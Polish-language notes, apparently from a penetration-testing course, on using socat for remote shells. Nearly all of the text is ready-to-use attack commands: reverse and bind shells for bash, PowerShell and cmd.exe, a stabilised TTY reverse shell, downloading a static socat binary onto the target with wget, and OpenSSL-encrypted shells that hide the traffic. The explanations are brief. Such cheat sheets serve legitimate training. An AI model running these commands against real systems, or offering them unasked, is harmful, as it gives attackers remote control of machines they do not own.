Socat zapewnia połączenie między dwoma punktami.

# rev shell

Podstawowy reverse shell listener:
`socat TCP-L:<port> -` - to to samo co `nc -lvnp <port>`

Na windowsie do połączenia się z powrotem `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` - pipes jest po to żeby powershell miał unix style standard input i output.

Na linux do połaczenia z powrotem `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

# Bind shell

na Linux `socat TCP-L:<PORT> EXEC:"bash -li"`

Na windows `socat TCP-L:<PORT> EXEC:powershell.exe,pipes` - pipes żeby między windows a unix dogadywały się instrukcje wejścia wyjścia.

To na naszym komputerze żeby się połączyć `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

# W pełni stabilny tty rev shell

```socat TCP-L:<port> FILE:`tty`,raw,echo=0``` - to tego listenera można się połączyć z dowolnym payloadem ale żęby to zadziałało trzeba wysłać do celu [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) raczej robi się to hostując `python3 -m http.server 80` i dalej pobierając na celu `wget <LOCAL-IP>/socat -O /tmp/socat`
Na tym komputerze (celu) trzeba wpisać to: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`i to działa tak:
- EXEC:"bash -li" tworzy ineraktywną sesję bash. dalej argumenty:
  - pty - alokuje pseudoterminal na celu - część procesu stabilizacji
  - stderr - spowoduje że jakiekolwiek błędy wyświetlą się w powłoce
  - sigint - ctrl + c zabije proces a nie terminal
  - setsid - tworzy proces w nowej sesji
  - sane - stabilizuje terminal próbując go "znormalizować".
Powłoka socat jest w pełni interaktywna co pozwala na używanie takich narzędzi jak ssh żeby się połączyć. Jak powłoka socat nie działa poprawnie to warto zwiększyć verbosity dodając `-d -d` do polecenia.

# Szyfrowana powłoka

Scoat pozwala na szyfrowanie połaczenia tworząc zaszyfrowaną powłokę, może być bind i reverse shell. Jak w poprzednich poleceniach korzystano z TCP to tutaj będzie `OPENSSL`.
Najpierw trzeba wygenerować klucze kryptograficzne (najlepiej na naszym pc)
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt` To stworzy certyfikat i klucz, dalej trzeba je zbić w jeden plik .pem
`cat shell.key shell.crt > shell.pem`

Listener pod reverse shell:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`, verify 0 jest po to żeby nie walidować certyfikatu.

Połączenie pod tego reverse shell:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

Windows cel
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
atakujący:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`